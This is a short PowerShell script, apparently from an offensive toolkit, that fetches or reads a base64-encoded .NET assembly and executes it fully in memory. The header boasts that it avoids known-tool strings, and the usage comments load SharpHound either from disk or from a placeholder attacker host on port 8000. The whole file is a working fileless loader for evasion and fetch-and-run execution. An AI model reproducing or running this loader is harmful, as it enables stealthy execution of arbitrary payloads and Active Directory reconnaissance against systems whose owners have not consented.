# InMem-Asm.ps1 - custom base64 -> memory assembly loader (no known-tool strings)
# Reads a .b64 text (plain text on disk / fetchable via raw), decodes, runs fully in RAM.
# Usage:
#   . .\ps1\InMem-Asm.ps1
#   Invoke-AsmFromB64 -B64Path .\tools-obf\SharpHound.exe.b64 -AsmArgs '-c','All','--outputdirectory',$env:TEMP
#   Invoke-AsmFromB64 -B64Url 'http://<attack>:8000/SharpHound.exe.b64' -AsmArgs '--help'
param()

function Invoke-AsmFromB64 {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName='p')][string]$B64Path,
        [Parameter(ParameterSetName='u')][string]$B64Url,
        [string[]]$AsmArgs = @()
    )
    if ($PSCmdlet.ParameterSetName -eq 'u') {
        $wc = New-Object Net.WebClient
        $raw = $wc.DownloadString($B64Url)
    } else {
        $raw = [IO.File]::ReadAllText((Resolve-Path $B64Path))
    }
    $b64 = ($raw -replace '\s', '')
    $bytes = [Convert]::FromBase64String($b64)
    Write-Verbose ("[*] {0} bytes decoded" -f $bytes.Length)
    $asm = [Reflection.Assembly]::Load($bytes)
    $ep = $asm.EntryPoint
    if ($null -eq $ep) { throw 'no entry point in assembly' }
    if ($ep.IsStatic) {
        $null = $ep.Invoke($null, @( ,$AsmArgs ))
    } else {
        $obj = [Activator]::CreateInstance($ep.DeclaringType)
        $null = $ep.Invoke($obj, @( ,$AsmArgs ))
    }
}
